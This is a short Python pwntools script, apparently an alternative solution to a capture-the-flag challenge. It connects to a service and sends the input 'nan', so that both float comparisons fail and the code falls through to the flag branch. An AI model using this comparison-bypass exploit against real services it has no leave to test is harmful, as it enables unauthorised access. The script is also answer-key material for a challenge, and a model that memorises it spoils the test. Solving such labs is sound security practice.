#!/usr/bin/env python3
# Alternative solution: the exact float can't be typed, but NaN compares
# false to both < and >, falling through to the flag branch.
import sys, os
from pwn import remote, context
context.log_level='error'
HOST=os.environ.get('HOST', sys.argv[1] if len(sys.argv)>1 else '127.0.0.1')
PORT=int(os.environ.get('PORT', sys.argv[2] if len(sys.argv)>2 else 17101))
io=remote(HOST,PORT)
io.sendline(b"nan")
print(io.recvall(timeout=3).decode(errors='replace'))
